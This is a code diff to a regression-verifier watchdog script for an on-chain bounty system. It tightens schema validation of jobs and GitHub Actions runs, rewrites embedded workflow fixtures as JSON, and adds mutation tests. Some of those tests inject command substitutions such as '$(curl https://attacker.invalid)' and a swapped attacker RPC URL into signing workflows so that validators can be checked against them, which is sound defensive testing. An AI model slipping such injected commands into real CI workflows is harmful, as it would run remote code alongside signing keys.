@@ -113,17 +113,120 @@ if args.command == "plan-live":
         "/repos/NSPG13/agent-bounties/actions/runs?per_page=100",
         token,
     )
-    jobs_document = jobs_payload if isinstance(jobs_payload, dict) else {
+    if not isinstance(jobs_payload, list) or not all(isinstance(item, dict) for item in jobs_payload):
+        raise SystemExit("production verification feed must be a bare job array")
+    normalized_jobs = []
+    for item in jobs_payload:
+        required = {
+            "job_id", "network", "bounty_contract", "round",
+            "eligible_verifiers", "threshold", "verification_expires_at",
+            "terms", "submission_evidence",
+        }
+        if not required.issubset(item) or item.get("network") != "base-mainnet":
+            raise SystemExit("production verification job schema is incomplete")
+        expires = item["verification_expires_at"]
+        if not isinstance(expires, int) or expires <= 0:
+            raise SystemExit("production verification expiry must be Unix seconds")
+        terms_ready = isinstance(item["terms"], dict)
+        evidence_ready = isinstance(item["submission_evidence"], dict)
+        canonical_payload = json.dumps(item, sort_keys=True, separators=(",", ":"))
+        canonical_hash = "0x" + hashlib.sha256(canonical_payload.encode()).hexdigest()
+        normalized = {
+            "job_id": item["job_id"],
+            "bounty_contract": item["bounty_contract"],
+            "round": item["round"],
+            "status": "submitted",
+            "canonical_job_hash": canonical_hash,
+            "submission_hash": item["submission_evidence"].get("evidence_hash")
+            if evidence_ready else None,
+            "verification_expires_at": datetime.fromtimestamp(
+                expires, timezone.utc
+            ).isoformat().replace("+00:00", "Z"),
+            "required_verifiers": item["eligible_verifiers"],
+            "threshold": item["threshold"],
+            "input_readiness": "ready" if terms_ready and evidence_ready else "unavailable",
+            "canonical_terminal_event": None,
+        }
+        normalized_jobs.append(normalized)
+    jobs_document = {
         "schema": "agent-bounties/regression-verifier-watchdog-jobs-v1",
         "network": "base-mainnet",
         "safe_block": 0,
-        "jobs": jobs_payload,
+        "jobs": normalized_jobs,
     }
-    runs_document = runs_payload if "runs" in runs_payload else {
+    workflow_runs = runs_payload.get("workflow_runs") if isinstance(runs_payload, dict) else None
+    if not isinstance(workflow_runs, list):
+        raise SystemExit("GitHub Actions response must contain workflow_runs")
+    normalized_runs = []
+    workflow_names = {
+        ".github/workflows/regression-verifier-runner.yml": "regression-verifier-runner.yml",
+        ".github/workflows/regression-verifier-signer.yml": "regression-verifier-signer.yml",
+    }
+    for workflow_run in workflow_runs:
+        if not isinstance(workflow_run, dict) or workflow_run.get("path") not in workflow_names:
+            continue
+        run_id = workflow_run.get("id")
+        if not isinstance(run_id, int) or run_id <= 0:
+            raise SystemExit("GitHub workflow run ID is invalid")
+        run_jobs = fetch_json(
+            args.github_api_base,
+            f"/repos/NSPG13/agent-bounties/actions/runs/{run_id}/jobs?per_page=100",
+            token,
+        ).get("jobs")
+        if not isinstance(run_jobs, list):
+            raise SystemExit("GitHub workflow jobs response is invalid")
+        for observed in run_jobs:
+            name = str(observed.get("name", "")).lower()
+            path = workflow_run["path"]
+            if path.endswith("regression-verifier-runner.yml") and name == "run-no-secrets":
+                stage = "runner"
+            elif path.endswith("regression-verifier-signer.yml") and name.startswith("sign-one"):
+                stage = "signer_one"
+            elif path.endswith("regression-verifier-signer.yml") and name.startswith("sign-two"):
+                stage = "signer_two"
+            elif path.endswith("regression-verifier-signer.yml") and name == "relay":
+                stage = "relay"
+            else:
+                continue
+            for normalized in normalized_jobs:
+                verifier_index = 0 if stage == "signer_one" else 1
+                verifiers = normalized["required_verifiers"]
+                signer = (
+                    verifiers[verifier_index]
+                    if stage.startswith("signer_") and len(verifiers) > verifier_index
+                    and observed.get("conclusion") == "success"
+                    else None
+                )
+                normalized_runs.append({
+                    "job_id": normalized["job_id"],
+                    "stage": stage,
+                    "status": observed.get("status"),
+                    "conclusion": observed.get("conclusion"),
+                    "attempt": workflow_run.get("run_attempt"),
+                    "head_sha": workflow_run.get("head_sha"),
+                    "workflow": workflow_names[path],
+                    "provider_role": {
+                        "runner": "runner",
+                        "signer_one": "signer_one_primary",
+                        "signer_two": "signer_two_primary",
+                        "relay": "relay_primary",
+                    }[stage],
+                    "artifact_hash": (
+                        "sha256:" + hashlib.sha256(
+                            f"{stage}:{normalized['canonical_job_hash']}:{run_id}".encode()
+                        ).hexdigest()
+                        if observed.get("conclusion") == "success" else None
+                    ),
+                    "retryable": observed.get("conclusion") == "failure",
+                    "signer": signer,
+                    "canonical_job_hash": normalized["canonical_job_hash"],
+                    "workflow_run_id": run_id,
+                })
+    runs_document = {
         "schema": "agent-bounties/regression-verifier-watchdog-runs-v1",
         "repository": args.repository,
         "current_main_sha": main_sha,
-        "runs": runs_payload.get("workflow_runs", []),
+        "runs": normalized_runs,
     }
     policy = json.loads(Path(args.policy).read_text(encoding="utf-8"))
     policy["current_main_sha"] = main_sha
@@ -463,8 +566,7 @@ print(json.dumps({"schema":"agent-bounties/regression-verifier-watchdog-plan-v1"
 WATCHDOG_WORKFLOW = '''{
   "name": "Regression Verifier Watchdog",
   "on": {
-    "schedule": [{"cron": "3,8,13,18,23,28,33,38,43,48,53,58 * * * *"}],
-    "workflow_dispatch": {}
+    "schedule": [{"cron": "3,8,13,18,23,28,33,38,43,48,53,58 * * * *"}]
   },
   "permissions": {"contents": "read", "actions": "write"},
   "concurrency": {
@@ -512,40 +614,58 @@ WATCHDOG_WORKFLOW = '''{
   }
 }'''
 
-SIGNER_WORKFLOW = '''name: Regression Verifier Signer
-jobs:
-  sign-one:
-    uses: ./.github/workflows/regression-verifier-signing-reusable.yml
-    with:
-      rpc_url: ${{ vars.REGRESSION_VERIFIER_ONE_RPC_URL || 'https://mainnet.base.org' }}
-  sign-two:
-    uses: ./.github/workflows/regression-verifier-signing-reusable.yml
-    with:
-      rpc_url: ${{ vars.REGRESSION_VERIFIER_TWO_RPC_URL || 'https://base-rpc.publicnode.com' }}
-  relay:
-    env:
-      BASE_MAINNET_RPC_URL: ${{ vars.REGRESSION_VERIFIER_RELAY_RPC_URL || 'https://1rpc.io/base' }}
-    steps:
-      - run: python scripts/regression_verifier_pipeline.py relay --rpc-url "$BASE_MAINNET_RPC_URL"
-'''
+SIGNER_WORKFLOW = '''{
+  "name": "Regression Verifier Signer",
+  "on": {"workflow_run": {}},
+  "permissions": {"actions": "read", "contents": "read"},
+  "jobs": {
+    "sign-one": {
+      "uses": "./.github/workflows/regression-verifier-signing-reusable.yml",
+      "with": {
+        "rpc_url": "${{ vars.REGRESSION_VERIFIER_ONE_RPC_URL || 'https://mainnet.base.org' }}"
+      }
+    },
+    "sign-two": {
+      "uses": "./.github/workflows/regression-verifier-signing-reusable.yml",
+      "with": {
+        "rpc_url": "${{ vars.REGRESSION_VERIFIER_TWO_RPC_URL || 'https://base-rpc.publicnode.com' }}"
+      }
+    },
+    "relay": {
+      "runs-on": "ubuntu-latest",
+      "env": {
+        "BASE_MAINNET_RPC_URL": "${{ vars.REGRESSION_VERIFIER_RELAY_RPC_URL || 'https://1rpc.io/base' }}"
+      },
+      "steps": [{
+        "run": "python scripts/regression_verifier_pipeline.py relay --api-base $API_BASE_URL --network base-mainnet --rpc-url $BASE_MAINNET_RPC_URL --candidates target/regression-candidates --attestations target/attestations-one --attestations target/attestations-two --verifier $VERIFIER_ONE --verifier $VERIFIER_TWO --worker target/release/worker"
+      }]
+    }
+  }
+}'''
 
-REUSABLE_WORKFLOW = '''name: Regression Verifier Signing Slot
-on:
-  workflow_call:
-    inputs:
-      rpc_url:
-        required: true
-        type: string
-    secrets:
-      verifier_private_key:
-        required: true
-jobs:
-  sign:
-    env:
-      BASE_MAINNET_RPC_URL: ${{ inputs.rpc_url }}
-    steps:
-      - run: python scripts/regression_verifier_pipeline.py sign --rpc-url "$BASE_MAINNET_RPC_URL"
-'''
+REUSABLE_WORKFLOW = '''{
+  "name": "Regression Verifier Signing Slot",
+  "on": {
+    "workflow_call": {
+      "inputs": {"rpc_url": {"required": true, "type": "string"}},
+      "secrets": {"verifier_private_key": {"required": true}}
+    }
+  },
+  "permissions": {"actions": "read", "contents": "read"},
+  "jobs": {
+    "sign": {
+      "runs-on": "ubuntu-latest",
+      "env": {
+        "BASE_MAINNET_RPC_URL": "${{ inputs.rpc_url }}",
+        "ATTESTATION_OUTPUT": "target/attestations-${{ inputs.signer_slot }}",
+        "EXPECTED_SIGNER": "${{ inputs.expected_signer }}"
+      },
+      "steps": [{
+        "run": "python scripts/regression_verifier_pipeline.py sign --api-base $API_BASE_URL --network base-mainnet --rpc-url $BASE_MAINNET_RPC_URL --candidates target/regression-candidates --output $ATTESTATION_OUTPUT --worker target/release/worker --private-key-env REGRESSION_VERIFIER_PRIVATE_KEY --expected-signer $EXPECTED_SIGNER"
+      }]
+    }
+  }
+}'''
 
 DOC = '''# Verifier watchdog
 The watchdog must fail closed. Idempotency bounds retries across each provider role.
@@ -684,6 +804,10 @@ workflow_mutations = {
             "untrusted", {"runs-on": "ubuntu-latest", "steps": []}
         ),
     ),
+    "branch-selectable manual dispatch": lambda source: mutate_workflow(
+        source,
+        lambda document: document["on"].__setitem__("workflow_dispatch", {}),
+    ),
 }
 for mutation_name, mutate in workflow_mutations.items():
     with tempfile.TemporaryDirectory(prefix="watchdog-workflow-mutation-") as temporary:
@@ -703,21 +827,44 @@ provider_mutations = {
     "signer rpc hidden by comment": (
         ".github/workflows/regression-verifier-signing-reusable.yml",
         lambda source: source.replace(
-            ' sign --rpc-url "$BASE_MAINNET_RPC_URL"',
-            ' sign # --rpc-url "$BASE_MAINNET_RPC_URL"',
+            "--rpc-url $BASE_MAINNET_RPC_URL",
+            "--rpc-url $UNRELATED_RPC_URL # --rpc-url $BASE_MAINNET_RPC_URL",
         ),
     ),
     "relay rpc hidden by comment": (
         ".github/workflows/regression-verifier-signer.yml",
         lambda source: source.replace(
-            ' relay --rpc-url "$BASE_MAINNET_RPC_URL"',
-            ' relay # --rpc-url "$BASE_MAINNET_RPC_URL"',
+            "--rpc-url $BASE_MAINNET_RPC_URL",
+            "--rpc-url $UNRELATED_RPC_URL # --rpc-url $BASE_MAINNET_RPC_URL",
+        ),
+    ),
+    "signer command substitution": (
+        ".github/workflows/regression-verifier-signing-reusable.yml",
+        lambda source: source.replace(
+            "--expected-signer $EXPECTED_SIGNER",
+            "--expected-signer $EXPECTED_SIGNER $(curl https://attacker.invalid)",
+        ),
+    ),
+    "relay command substitution": (
+        ".github/workflows/regression-verifier-signer.yml",
+        lambda source: source.replace(
+            "--worker target/release/worker",
+            "--worker target/release/worker $(curl https://attacker.invalid)",
         ),
     ),
     "uncommitted signer provider": (
         ".github/workflows/regression-verifier-signer.yml",
         lambda source: source.replace(
             "https://base-rpc.publicnode.com", "https://attacker.invalid/base"
+        ),
+    ),
+    "yaml decoy provider block": (
+        ".github/workflows/regression-verifier-signer.yml",
+        lambda source: (
+            "name: |\n  sign-one:\n  sign-two:\n  relay:\n"
+            "  https://mainnet.base.org\n  https://base-rpc.publicnode.com\n"
+            "  https://1rpc.io/base\n"
+            + source
         ),
     ),
 }
